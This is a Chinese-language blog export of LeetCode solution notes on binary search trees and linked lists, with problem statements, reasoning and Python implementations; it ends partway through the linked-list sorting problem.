找到该树中两个指定节点的最近公共祖先。百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”例如，给定如下二叉搜索树: root = [6,2,8,0,4,7,9,null,null,3,5]示例 1:123输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8输出: 6 解释: 节点 2 和节点 8 的最近公共祖先是 6。示例 2:123输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4输出: 2解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。说明:所有节点的值都是唯一的。p、q 为不同节点且均存在于给定的二叉搜索树中。思路最近公共子节点有可能是下面这几种情况：具体步骤如下：从根节点开始遍历树如果节点 p 和节点 q 都在右子树上，那么以右孩子为根节点继续 1 的操作如果节点 p 和节点 q 都在左子树上，那么以左孩子为根节点继续 1 的操作如果条件 2 和条件 3 都不成立，这就意味着我们已经找到节 p 和节点 q 的 LCA 了二叉搜索树的最近公共祖先Python实现方法1：递归12345678910class Solution: def lowestCommonAncestor(self, root: 'TreeNode', p: 'TreeNode', q: 'TreeNode') -&gt; 'TreeNode': if root.val &lt; p.val and root.val &lt; q.val: return self.lowestCommonAncestor(root.right,p,q) elif root.val &gt; p.val and root.val &gt; q.val: return self.lowestCommonAncestor(root.left,p,q) else: return root方法2：迭代12345678910class Solution: def lowestCommonAncestor(self, root: 'TreeNode', p: 'TreeNode', q: 'TreeNode') -&gt; 'TreeNode': cur_node = root while cur_node: if p.val &gt; cur_node.val and q.val &gt; cur_node.val: cur_node = cur_node.right elif p.val &lt; cur_node.val and q.val &lt; cur_node.val: cur_node = cur_node.left else: return cur_node450-删除二叉搜索树中的节点题目描述给定一个二叉搜索树的根节点 root 和一个值 key，删除二叉搜索树中的 key 对应的节点，并保证二叉搜索树的性质不变。返回二叉搜索树（有可能被更新）的根节点的引用。一般来说，删除节点可分为两个步骤：首先找到需要删除的节点；如果找到了，删除它。说明： 要求算法时间复杂度为 O(h)，h 为树的高度。示例:12345678root = [5,3,6,2,4,null,7]key = 3 5 / \ 3 6 / \ \2 4 7给定需要删除的节点值是 3，所以我们首先找到 3 这个节点，然后删除它。一个正确的答案是 [5,4,6,2,null,null,7], 如下图所示。12345 5 / \ 4 6 / \2 7另一个正确答案是 [5,2,6,null,4,null,7]。12345 5 / \2 6 \ \ 4 7思路理解这个算法的关键在于保持 BST 中序遍历的顺序性。删除一个节点会有三种情况，具体见下面的图解：流程1流程2流程3流程4用前驱或者后继结点代替被删除结点（Python、Java 代码）Python实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051class Solution: def deleteNode(self, root: TreeNode, key: int) -&gt; TreeNode: if root is None: return None # 递归调用左子树 if key &lt; root.val: root.left = self.deleteNode(root.left, key) return root # 递归调用右子树 if key &gt; root.val: root.right = self.deleteNode(root.right, key) return root # 当前节点的val正好等于key # 当前节点的左子节点不存在，直接提升右子节点即可 if root.left is None: new_root = root.right root.right = None return new_root # 当前节点的右子节点不存在，直接提升左子节点即可 if root.right is None: new_root = root.left root.left = None return new_root # 当前节点的左右子节点均存在，这里我用左子树中最大的点来替换 # 寻找左子树中最大的点（即最右边这个节点） node = root.left while node.right != None: node = node.right # 左子树中最大的点变为新的根节点 new_root = TreeNode(node.val) # 新的根节点的左子树需要更新 new_root.left = self.removeMax(root.left) # 新的根节点的右子树即为原来的右子树 new_root.right = root.right root.left = None root.right = None return new_root def removeMax(self, node): if node.right == None: new_root = node.left node.left = None return new_root node.right = self.removeMax(node.right) return node如果不把待删除节点的左右节点设置为None会怎么样？写这两行代码是出于面向对象的程序语言（Python 和 Java 都是）的垃圾回收机制（Garbage Collection，GC）的考虑。如果一个对象没有被其它对象引用，它会在合适的时候被垃圾回收机制回收，被垃圾回收机制回收即是真正从内存中删除了，语义上也没有必要保留这两个引用。669-修剪二叉搜索树题目描述给定一个二叉搜索树，同时给定最小边界L 和最大边界 R。通过修剪二叉搜索树，使得所有节点的值在[L, R]中 (R&gt;=L) 。你可能需要改变树的根节点，所以结果应当返回修剪好的二叉搜索树的新的根节点。示例 1:123456789101112输入: 1 / \ 0 2 L = 1 R = 2输出: 1 \ 2示例 2:123456789101112131415161718输入: 3 / \ 0 4 \ 2 / 1 L = 1 R = 3输出: 3 / 2 / 1思路这里我用递归来进行修建：当 node.val &gt; R，那么修剪后的二叉树必定出现在节点的左边。当 node.val &lt; L，那么修剪后的二叉树出现在节点的右边。否则，我们将会修剪树的两边。Python实现12345678910111213141516class Solution: def trimBST(self, root: TreeNode, L: int, R: int) -&gt; TreeNode: if root == None: return None if root.val &gt; R: return self.trimBST(root.left,L,R) if root.val &lt; L: return self.trimBST(root.right,L,R) if root.val &gt;= L and root.val &lt;= R: root.left = self.trimBST(root.left,L,R) root.right = self.trimBST(root.right,L,R) return root700-二叉搜索树中的搜索题目描述给定二叉搜索树（BST）的根节点和一个值。 你需要在BST中找到节点值等于给定值的节点。 返回以该节点为根的子树。 如果节点不存在，则返回 NULL。例如，给定二叉搜索树:12345 4 / \ 2 7 / \1 3和值：2你应该返回如下子树:123 2 / \ 1 3在上述示例中，如果要找的值是 5，但因为没有节点值为 5，我们应该返回 NULL。思路根据二叉搜索树的性质：如果val小于当前结点的值，转向其左子树继续搜索；如果val大于当前结点的值，转向其右子树继续搜索；如果已找到，则返回当前结点。如果搜索到最后仍未找到结点，则返回None。Python实现方法1：递归1234567891011class Solution: def searchBST(self, root: TreeNode, val: int) -&gt; TreeNode: if root == None: return None if val &gt; root.val: return self.searchBST(root.right,val) elif val &lt; root.val: return self.searchBST(root.left,val) else: return root方法2：迭代1234567891011121314class Solution: def searchBST(self, root: TreeNode, val: int) -&gt; TreeNode: if root == None: return None while root: if val &gt; root.val: root = root.right elif val &lt; root.val: root = root.left elif val == root.val: return root return None701-二叉搜索树中的插入操作题目描述给定二叉搜索树（BST）的根节点和要插入树中的值，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。保证原始二叉搜索树中不存在新值。注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回任意有效的结果。例如，给定二叉搜索树:12345 4 / \ 2 7 / \1 3和 插入的值: 5你可以返回这个二叉搜索树:12345 4 / \ 2 7 / \ /1 3 5或者这个树也是有效的:1234567 5 / \ 2 7 / \ 1 3 \ 4思路这里我们采用经典的插入方法，使整体操作变化最小。直接深拷贝构造新树，然后修改寻找到合适的叶位置后插入新节点，这样只需要在原树的某个叶节点处延伸一个节点Python实现1234567891011121314151617181920212223242526class Solution: def insertIntoBST(self, root: TreeNode, val: int) -&gt; TreeNode: res = copy.deepcopy(root) cur_node = res # 如果二叉搜索树为空树，用val构造二叉树节点作为根节点并返回 if cur_node == None: return TreeNode(val) while cur_node: if val &gt; cur_node.val: # 走向右子树 if cur_node.right != None: cur_node = cur_node.right # 应该走向右子树而右子树为空，即找到了插入位置 else: cur_node.right = TreeNode(val) return res elif val &lt; cur_node.val: # 走向左子树 if cur_node.left != None: cur_node = cur_node.left # 应该走向左子树而左子树为空，即找到了插入位置 else: cur_node.left = TreeNode(val) return res98-验证二叉搜索树题目描述给定一个二叉树，判断其是否是一个有效的二叉搜索树。假设一个二叉搜索树具有如下特征：节点的左子树只包含小于当前节点的数。节点的右子树只包含大于当前节点的数。所有左子树和右子树自身必须也是二叉搜索树。示例 1:12345输入: 2 / \ 1 3输出: true示例 2:12345678输入: 5 / \ 1 4 / \ 3 6输出: false解释: 输入为: [5,1,4,null,null,3,6]。根节点的值为 5 ，但是其右子节点值为 4思路方法1：递归看到这道题目，我们首先想到遍历整棵树，检查 node.right.val &gt; node.val 和 node.left.val &lt; node.val 对每个结点是否成立。但是这种方法并不总是正确。因为不仅右子结点要大于该节点，整个右子树的元素都应该大于该节点。这意味着我们需要在遍历树的同时保留结点的上界与下界，在比较时不仅比较子结点的值，也要与上下界比较。方法2：中序遍历中序遍历按照左子树 -&gt; 结点 -&gt; 右子树的顺序，这意味着一个二叉搜索树的中序遍历得到的每个元素都应该比下一个元素小。具体步骤：计算中序遍历列表inorder检查中序遍历列表是否从小到大Python实现方法1：12345678910111213class Solution: def isValidBST(self, root: TreeNode) -&gt; bool: def helper(root,max_val,min_val): if root == None: return True if root.val &lt; max_val and root.val &gt; min_val: return helper(root.left,root.val,min_val) and helper(root.right,max_val,root.val) max_val = float('inf') min_val = -float('inf') return helper(root,max_val,min_val)方法2：12345678910111213141516171819202122232425262728class Solution: def isValidBST(self, root: TreeNode) -&gt; bool: if root == None: return True pre = -float('inf') stack = [] p_node = root while stack or p_node: # 把所有当前访问节点的左孩子都入栈 while p_node: stack.append(p_node) p_node = p_node.left # 操作栈顶节点，如果是第一次运行到这步，那么这是整棵树的最左节点 cur_node = stack.pop() # 检查是否从小到大 if cur_node.val &gt; pre: pre = cur_node.val else: return False # 将指针指向当前节点的右节点 if cur_node.right != None: p_node = cur_node.right return True99-恢复二叉搜索树题目描述二叉搜索树中的两个节点被错误地交换。请在不改变其结构的情况下，恢复这棵树。示例 1:123456789101112131415输入: [1,3,null,null,2] 1 / 3 \ 2输出: [3,1,null,null,2] 3 / 1 \ 2示例 2:123456789101112131415输入: [3,1,4,null,null,2] 3 / \1 4 / 2输出: [2,1,4,null,null,3] 2 / \1 4 / 3进阶:使用 O(n) 空间复杂度的解法很容易实现。你能想出一个只使用常数空间的解决方案吗？思路二叉搜索树中序遍历输出应该是递增的，在遍历二叉树的过程中找到不满足递增的点（即错误交换的点），交换两者的值即可。注意：错误交换的点在中序遍历结果中可能是相邻的，也可能是不相邻的。错误交换的点是相邻的（中序遍历结果1324）：使用first和second表示错误交换的两个点，在第一次遇到不递增的情况时，将first置为3，second置为2，遍历结束后交换first与second。错误交换的点是不相邻的（中序遍历结果3214）：在第一次遇到不递增的情况时，将first设置为3，second设置为2，在第二次遇到不递增的情况时，只改变second，将second置为1.遍历结束后交换first与second。Python实现1234567891011121314151617181920212223242526272829303132333435363738class Solution: def recoverTree(self, root: TreeNode) -&gt; None: """ Do not return anything, modify root in-place instead. """ if root == None: return None pre = TreeNode(-float('inf')) first_node = None second_node = None stack = [] p_node = root while stack or p_node: while p_node: stack.append(p_node) p_node = p_node.left cur_node = stack.pop() # 根据当前节点和前一个节点的值来判断节点是否错误 if cur_node.val &gt; pre.val: pre = cur_node else: # 第一次相遇 if first_node == None: first_node = pre second_node = cur_node # 第二次相遇 else: second_node = cur_node if cur_node.right != None: p_node = cur_node.right # 交换两个错误交换的节点 first_node.val,second_node.val = second_node.val,first_node.val230-二叉搜索树中第K小的元素题目描述给定一个二叉搜索树，编写一个函数 kthSmallest 来查找其中第 k 个最小的元素。说明：你可以假设 k 总是有效的，1 ≤ k ≤ 二叉搜索树元素个数。示例 1:1234567输入: root = [3,1,4,null,2], k = 1 3 / \ 1 4 \ 2输出: 1示例 2:123456789输入: root = [5,3,6,2,4,null,null,1], k = 3 5 / \ 3 6 / \ 2 4 / 1输出: 3进阶：如果二叉搜索树经常被修改（插入/删除操作）并且你需要频繁地查找第 k 小的值，你将如何优化 kthSmallest 函数？思路二叉搜索树的中序遍历序列为递增序列，因此可中序遍历二叉搜索树，返回第K个元素。Python实现1234567891011121314151617181920212223class Solution: def kthSmallest(self, root: TreeNode, k: int) -&gt; int: if root == None: return None # 中序遍历二叉树 res = [] stack = [] p_node = root while stack or p_node: while p_node: stack.append(p_node) p_node = p_node.left cur_node = stack.pop() res.append(cur_node.val) if cur_node.right != None: p_node = cur_node.right # 返回第k个元素 return res[k-1]我们也可以提前中止中序遍历：1234567891011121314151617181920212223class Solution: def kthSmallest(self, root: TreeNode, k: int) -&gt; int: if root == None: return None # 中序遍历二叉树 stack = [] p_node = root while stack or p_node: while p_node: stack.append(p_node) p_node = p_node.left cur_node = stack.pop() # 返回第k个元素 k -= 1 if k == 0: return cur_node.val if cur_node.right != None: p_node = cur_node.right501-二叉搜索树中的众数题目描述给定一个有相同值的二叉搜索树（BST），找出 BST 中的所有众数（出现频率最高的元素）。假定 BST 有如下定义：结点左子树中所含结点的值小于等于当前结点的值结点右子树中所含结点的值大于等于当前结点的值左子树和右子树都是二叉搜索树例如：12345678给定 BST [1,null,2,2], 1 \ 2 / 2返回[2].提示：如果众数超过1个，不需考虑输出顺序进阶：你可以不使用额外的空间吗？（假设由递归产生的隐式调用栈的开销不被计算在内）思路方法1：层序遍历+字典这里我用层次遍历，然后用一个字典记录每个值出现的次数，最后在字典中搜索最大值（即出现次数最多的值，也就是众数）。但是这种方法用了额外的空间。方法2：中序遍历二叉搜索树的中序遍历是一个升序序列，逐个比对当前结点值cur_node.val与前驱结点值pre_node.val。更新当前节点值出现次数curTimes及最大出现次数maxTimes，更新规则：若curTimes=maxTimes，将cur_node.val添加到结果向量res中若curTimes&gt;maxTimes，清空res，将cur_node.val添加到res，并更新maxTimes为curTimesPython实现方法1：123456789101112131415161718192021222324252627282930313233class Solution: def findMode(self, root: TreeNode) -&gt; List[int]: if root == None: return None dicts = &#123;&#125; queue = [root] while queue: length = len(queue) for _ in range(length): node = queue.pop(0) # 节点值存入字典 if node.val in dicts: dicts[node.val] += 1 else: dicts[node.val] = 1 if node.left != None: queue.append(node.left) if node.right != None: queue.append(node.right) # 计算众数 max_num = 0 for i,counts in dicts.items(): if counts &gt; max_num: res = [i] max_num = counts # 输出所有众数 elif counts == max_num: res.append(i) return res方法2：123456789101112131415161718192021222324252627282930313233343536373839class Solution: def findMode(self, root: TreeNode) -&gt; List[int]: if root == None: return None stack = [] p_node = root pre_node = TreeNode(float('inf')) maxTimes = 0 res = [] while stack or p_node: # 把所有当前访问节点的左孩子都入栈 while p_node != None: stack.append(p_node) p_node = p_node.left cur_node = stack.pop() # 更新当前节点出现次数 if pre_node.val == cur_node.val: curTimes += 1 else: curTimes = 1 # 最大出现次数 if maxTimes == curTimes: res.append(cur_node.val) elif maxTimes &lt; curTimes: res = [cur_node.val] maxTimes = curTimes # 更新前驱节点 pre_node = cur_node if cur_node.right != None: # 将指针指向当前节点的右节点 p_node = cur_node.right return res参考多动态图详细讲解二叉搜索树二叉查找树]]></content>
      <categories>
        <category>计算机基础</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>二叉树</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode题解汇总]]></title>
    <url>%2Farchives%2F91220368.html</url>
    <content type="text"><![CDATA[刷 LeetCode 的最大好处就是可以锻炼解决问题的思维能力，同时大量高质量的题目可以加深我们对计算机科学中经典数据结构的深刻理解，从而可以快速用合适的数据结构去解决现实中的问题。本文主要汇总了我的LeetCode题解。算法：LeetCode 题目总结 - 位运算LeetCode 题目总结 - 数组中的双指针问题LeetCode 题目总结 - 二分查找LeetCode 题目总结 - 链表LeetCode 题目总结 - 二叉树LeetCode 题目总结 - 二叉树的遍历LeetCode 题目总结 - 二叉搜索树LeetCode 题目总结 - 动态规划数据库：LeetCode 题目总结 - SQL其中不少题目参考了前人的解法，欢迎各位留言交流。LeetCode 刷题指南（一）：为什么要刷题]]></content>
      <categories>
        <category>计算机基础</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>二叉树</tag>
        <tag>数组</tag>
        <tag>双指针</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode题目总结-链表]]></title>
    <url>%2Farchives%2F551df4d4.html</url>
    <content type="text"><![CDATA[链表是一种利用不连续的内存块，通过在每块内存中存储下一块内存的指针而构造的线性存储结构，所以链表是线性表的一种形式。链表问题是一种考察基本编码能力的问题，这类问题的特点是解法并不复杂，难点在于证明解法的正确性，以及如何编码。即，考察是否能编写出bug free的代码，少数会考察算法的数学证明问题。很多链表的题目可以通过画图来辅助思考。本文总结的链表题目主要包括以下部分：链表的基本操作类题目反转类题目双指针问题数学问题链表的基础知识数组和链表的对比可以看：数组和链表的区别。链表类题目的常用技巧使用dummy node：dummy node就是在链表的head前加一个节点指向head，即dummy-&gt;head，可以理解成一个虚拟节点。有了dummy node就使得操作head节点与操作其他节点没有区别。特别适合用在链表的head发生变化的情况下，譬如删除或者被修改等。12dummy = ListNode(0)dummy.next = head双指针法：对于寻找链表的某个特定位置，或者判断是否有环等问题时，可以用两个指针变量fast和slow，两个指针以不同的策略移动，直到两个指针的值相等（或其他特殊条件）为止。12slow = headfast = head交换节点的处理：如果需要交换两个节点的位置，对于这两个前驱节点，他们的next指针会受到影响，这两个节点本身也会受到影响，可以用以下步骤：先交换两个前驱节点的next指针的值再交换这两个节点的next指针的值链表类题目测试代码1234567891011121314151617181920212223242526272829303132333435# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = None# Solution()代码# ...# ...# 链表生成函数def create_node_list(arr): head = ListNode(arr[0]) cur = head for i in range(1, len(arr)): cur.next = ListNode(arr[i]) cur = cur.next return head# 链表打印函数def print_node_list(head): while head: print(head.val, '-&gt;', end=' ') head = head.next print('NULL')if __name__ == '__main__': arr = [4, 2, 1, 3] head = create_node_list(arr) print_node_list(head) x = Solution() print_node_list(x.reorderList(head))链表的基本操作类题目删除链表中的节点203-移除链表元素237-删除链表中的节点合并链表21-合并两个有序链表23-合并k个排序链表分隔链表86-分隔链表交换链表24-两两交换链表中的节点旋转链表61-旋转链表链表排序143-重排链表147-对链表进行插入排序148-排序链表203-移除链表元素题目描述删除链表中等于给定值 val 的所有节点。示例:12输入: 1-&gt;2-&gt;6-&gt;3-&gt;4-&gt;5-&gt;6, val = 6输出: 1-&gt;2-&gt;3-&gt;4-&gt;5思路这道题目可以用双指针解决：设置两个指针，一个指针（fast）遍历原链表，另一个指针（slow）指向一个新的链表，只要当前值不等于给定值val，就把当前值添加到slow指针后面。不过这个方法用到了额外的空间，有没有办法在遍历过程中原地完成移除链表元素操作？如果只用一个指针遍历链表，我们会发现，当我们遍历到一个节点时，其实就无法删除这个节点了。所以如果想要删除某个节点，就必须找到这个节点的前一个节点，把前一个节点的指针改变，即指向下下一个。这样即可完成原地移除链表元素。下面是一个图解：动画演示 203. 移除链表元素Python实现12345678910111213141516class Solution: def removeElements(self, head: ListNode, val: int) -&gt; ListNode: dummy = ListNode(0) dummy.next = head p = dummy while p.next != None: # 当前值等于val，跳过，p指针不移动 if p.next.val == val: p.next = p.next.next # 当前值不等于val，p指针后移 else: p = p.next return dummy.next237-删除链表中的节点题目描述请编写一个函数，使其可以删除某个链表中给定的（非末尾）节点，你将只被给定要求被删除的节点。现有一个链表 – head = [4,5,1,9]，它可以表示为:示例 1:输入: head = [4,5,1,9], node = 5输出: [4,1,9]解释: 给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 1 -&gt; 9示例 2:输入: head = [4,5,1,9], node = 1输出: [4,5,9]解释: 给定你链表中值为 1 的第三个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 5 -&gt; 9说明:链表至少包含两个节点。链表中所有节点的值都是唯一的。给定的节点为非末尾节点并且一定是链表中的一个有效节点。不要从你的函数中返回任何结果。思路由于这道题目只输入了需要删除的节点node，因此无法获取删除节点node的前一个节点pre，从而也就无法将前一个节点pre指向删除节点的下一个节点next；既然无法通过修改指针完成，那么肯定要修改链表节点的值了，所以只要将删除节点node的值和指针都改为下一个节点next的值和指针即可。Python实现12345678class Solution: def deleteNode(self, node): """ :type node: ListNode :rtype: void Do not return anything, modify node in-place instead. """ node.val = node.next.val node.next = node.next.next21-合并两个有序链表题目描述将两个有序链表合并为一个新的有序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。示例：12输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4思路这里我们可以用到归并排序的思维。我们维护一个 cur 指针，我们需要做的是调整它的 next 指针。如果 l1 当前位置的值小于等于 l2 ，我们就把 l1 的值接在 cur 节点的后面同时将 l1 指针往后移一个。否则，我们对 l2 做同样的操作。不管我们将哪一个元素接在了后面，我们都把 cur 向后移一个元素。在循环终止的时候， l1 和 l2 至多有一个是非空的。由于输入的两个链表都是有序的，所以不管哪个链表是非空的，它包含的所有元素都比前面已经合并链表中的所有元素都要大。这意味着我们只需要简单地将非空链表接在合并链表的后面，并返回合并链表。Python实现1234567891011121314151617181920212223class Solution: def mergeTwoLists(self, l1: ListNode, l2: ListNode) -&gt; ListNode: dummy = ListNode(0) cur = dummy while l1 != None or l2 != None: # l1链表已经取完 if l1 == None: cur.next = l2 break # l2链表已经取完 if l2 == None: cur.next = l1 break if l1.val &gt;= l2.val: cur.next = ListNode(l2.val) cur = cur.next l2 = l2.next else: cur.next = ListNode(l1.val) cur = cur.next l1 = l1.next return dummy.next23-合并k个排序链表题目描述合并 k 个排序链表，返回合并后的排序链表。请分析和描述算法的复杂度。示例:1234567输入:[ 1-&gt;4-&gt;5, 1-&gt;3-&gt;4, 2-&gt;6]输出: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6思路看到这道题目，我们首先会想到一个很简单粗暴的办法，就是两两合并这k个排序链表，一共需要k次合并操作。时间复杂度：O(kN)，其中 k 是链表的数目。然后我们可以用分而治之的思想进行优化：首先我们将 k 个链表配对并将同一对中的链表合并。两个链表的合并见第21题。第一轮合并以后， k 个链表被合并成了 $\frac{k}{2}$ 个链表，平均长度为 $\frac{2N}{k}$ ，然后是 $\frac{k}{4}$ 个链表， $\frac{k}{8}$ 个链表等等。重复这一过程，直到我们得到了最终的有序链表。因此，我们在每一次配对合并的过程中都会遍历几乎全部 N 个节点，并重复这一过程 $\log_2K$ 次。时间复杂度： O(Nlogk) ，其中 k 是链表的数目。合并K个排序链表为什么这里分治的聚合次数是log2(K)次，而不是K-1次？两个链表聚合确实发生了K-1次。但是注意，题解中把 K个链表两两聚合，生成K/2个链表的过程叫一次Merging。然后这样的Merging总共发生log(K)次。每一次Merging需要比较的次数是N。所以总的时间复杂度是O(N*log(K))。这才是两两聚合和逐一聚合的本质差别。逐一聚合的情况下，两个聚合的链表长度会发生偏斜，其中一个链表长度越来越长。考虑最坏情况K个链表每个仅包含一个元素（N为总元素数，这里N=K)，那么逐一聚合的总复杂度就是O(1+2+3+...N-1) = O(K*N).两两聚合的情况下，仍然考虑刚才的例子，第一轮K个链表，聚合完成后剩K/2个，发生的比较次数是 1 + 1 + 1 + ...+ 1 =1*K = N第二轮K/2个链表，聚合完成后剩K/4个，发生的比较次数是(最坏情况) 2+2+2+ ... + 2 = 2 * K/2 = N第三轮K/4个链表，聚合完成后剩K/8个，发生的比较次数 4 + 4 + 4 + .... + 4 = 4 * K/4 = N…..最后一轮剩2个链表，比较次数 K/2 + K/2 = 2* K/2 = N总共有log(K)轮，总比较次数 N*log(K)Python实现12345678910111213141516171819202122232425262728293031323334353637383940class Solution: def mergeKLists(self, lists: List[ListNode]) -&gt; ListNode: k = len(lists) if k == 0: return None interval = 1 # 两两合并 while interval &lt; k: for i in range(0,k,interval*2): # 最后落单的链表直接保留 if i + interval &lt; k: lists[i] = self.mergeLists(lists[i],lists[i+interval]) interval *= 2 return lists[0] # 合并两个链表函数 def mergeLists(self,l1,l2): dummy = ListNode(0) cur = dummy while l1 != None or l2 != None: if l1 == None: cur.next = l2 break if l2 == None: cur.next = l1 break if l1.val &lt; l2.val: cur.next = ListNode(l1.val) cur = cur.next l1 = l1.next else: cur.next = ListNode(l2.val) cur = cur.next l2 = l2.next return dummy.next86-分隔链表题目描述给定一个链表和一个特定值 x，对链表进行分隔，使得所有小于 x 的节点都在大于或等于 x 的节点之前。你应当保留两个分区中每个节点的初始相对位置。示例:12输入: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3输出: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5思路如果不限制使用额外的空间的话，我们可以用两个链表，一个链表放小于x的节点，一个链表放大于等于x的节点，最后，拼接这两个链表。Python实现1234567891011121314151617181920212223class Solution: def partition(self, head: ListNode, x: int) -&gt; ListNode: # 创建两个链表，分别保存小于x的数、大于等于x的数 cur = head l1 = ListNode(0) l2 = ListNode(0) head1 = l1 head2 = l2 while cur != None: if cur.val &lt; x: l1.next = ListNode(cur.val) l1 = l1.next else: l2.next = ListNode(cur.val) l2 = l2.next cur = cur.next # 两个链表拼接在一起 l1.next = head2.next return head1.next24-两两交换链表中的节点题目描述给定一个链表，两两交换其中相邻的节点，并返回交换后的链表。你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。示例:1给定 1-&gt;2-&gt;3-&gt;4, 你应该返回 2-&gt;1-&gt;4-&gt;3.思路首先建立一个dummy为哑头节点，它的next指向head。为了保证节点不丢失，我一共设置了pre、a、b三个指针，然后更新指针，完成交换。这里迭代的终止条件是pre.next为空或pre.next.next节点为空（说明后面的节点不到两个，无需交换）。下面是一个图解：动画演示 24. 两两交换链表中的节点Python实现12345678910111213141516171819class Solution: def swapPairs(self, head: ListNode) -&gt; ListNode: # 创建哑头节点 dummy = ListNode(0) dummy.next = head pre = dummy a = dummy b = dummy while pre.next != None and pre.next.next != None: a = pre.next b = pre.next.next pre.next = b a.next = b.next b.next = a pre = pre.next.next return dummy.next61-旋转链表题目描述给定一个链表，旋转链表，将链表每个节点向右移动 k 个位置，其中 k 是非负数。示例 1:12345输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, k = 2输出: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL解释:向右旋转 1 步: 5-&gt;1-&gt;2-&gt;3-&gt;4-&gt;NULL向右旋转 2 步: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL示例 2:1234567输入: 0-&gt;1-&gt;2-&gt;NULL, k = 4输出: 2-&gt;0-&gt;1-&gt;NULL解释:向右旋转 1 步: 2-&gt;0-&gt;1-&gt;NULL向右旋转 2 步: 1-&gt;2-&gt;0-&gt;NULL向右旋转 3 步: 0-&gt;1-&gt;2-&gt;NULL向右旋转 4 步: 2-&gt;0-&gt;1-&gt;NULL思路链表中的点已经相连，一次旋转操作意味着：我们可以先将链表闭合成环，然后找到相应的位置断开这个环，最后确定新的链表头和链表尾。具体步骤：首先找到旧的尾部并将其与链表头相连（cur.next = head），整个链表闭合成环，同时计算出链表的长度n。然后找到新的尾部，第 n - k % n - 1 个节点 ，新的链表头是第 n - k % n 个节点。最后断开环 end.next = None，并返回新的链表头 new_head。旋转链表Python实现123456789101112131415161718192021222324252627class Solution: def rotateRight(self, head: ListNode, k: int) -&gt; ListNode: if head == None: return None if head.next == None: return head # 循环找到链表末尾 n = 1 cur = head while cur.next != None: cur = cur.next n += 1 # 链表末尾连接到链表头 cur.next = head # 循环找到链表第k个节点（拆分处） end = head for _ in range(n-k%n-1): end = end.next # 断开第k个节点 new_head = end.next end.next = None return new_head143-重排链表题目描述给定一个单链表 L：L0→L1→…→Ln-1→Ln，将其重新排列后变为： L0→Ln→L1→Ln-1→L2→Ln-2→…你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。示例 1:1给定链表 1-&gt;2-&gt;3-&gt;4, 重新排列为 1-&gt;4-&gt;2-&gt;3.示例 2:1给定链表 1-&gt;2-&gt;3-&gt;4-&gt;5, 重新排列为 1-&gt;5-&gt;2-&gt;4-&gt;3.思路先将链表拆分成前后两半A和B。后一半B逆转成C。再将A和C交叉合并。例如：1-&gt;2-&gt;3-&gt;4-&gt;5拆分成：A=1-&gt;2-&gt;3，B=4-&gt;5。然后把B逆转成C=5-&gt;4。最后A和C交叉合并成D=1-&gt;5-&gt;2-&gt;4-&gt;3。Python实现123456789101112131415161718192021222324252627282930313233343536373839404142434445class Solution: def reorderList(self, head: ListNode) -&gt; None: """ Do not return anything, modify head in-place instead. """ if head == None: return None # 找到中间节点 slow = head fast = head while fast.next != None and fast.next.next != None: slow = slow.next fast = fast.next.next # 从中间拆分成两个链表 a = head b = slow.next slow.next = None # 反转链表B得到C pre = None cur = b while cur != None: temp = cur.next cur.next = pre pre = cur cur = temp c = pre # 交叉合并A、C得到D dummy = ListNode(0) d = dummy while a != None or c != None: if a != None: d.next = a d = d.next a = a.next if c != None: d.next = c d = d.next c = c.next return dummy.next147-对链表进行插入排序题目描述对链表进行插入排序。插入排序的动画演示如上。从第一个元素开始，该链表可以被认为已经部分排序（用黑色表示）。每次迭代时，从输入数据中移除一个元素（用红色表示），并原地将其插入到已排好序的链表中。插入排序算法：插入排序是迭代的，每次只移动一个元素，直到所有元素可以形成一个有序的输出列表。每次迭代中，插入排序只从输入数据中移除一个待排序的元素，找到它在序列中适当的位置，并将其插入。重复直到所有输入数据插入完为止。示例 1：12输入: 4-&gt;2-&gt;1-&gt;3输出: 1-&gt;2-&gt;3-&gt;4示例 2：12输入: -1-&gt;5-&gt;3-&gt;4-&gt;0输出: -1-&gt;0-&gt;3-&gt;4-&gt;5思路按照插入排序的方法，只是这里每个数都是从链表的前面开始一个个比较。Python实现12345678910111213141516171819202122232425class Solution: def insertionSortList(self, head: ListNode) -&gt; ListNode: # 创建哑头节点（pre是一个新的链表） dummy = ListNode(0) pre = dummy cur = head while cur != None: # 保留cur.next的指针 temp = cur.next # 链表中当前位置的数小于待插入的数，当前位置后移 while pre.next != None and pre.next.val &lt; cur.val: pre = pre.next # 已确定插入位置，完成插入 cur.next = pre.next pre.next = cur # pre、cur改变（为下一次循环做准备） cur = temp pre = dummy return dummy.next注意：结果链表pre是一个以dummy为首节点的新链表，跟原来的链表没关系。148-排序链表题目描述在 O(n log n) 时间复杂度和常数级空间复杂度下，对链表进行排序。示例 1:12输入: 4-&gt;2-&gt;1-&gt;3输出: 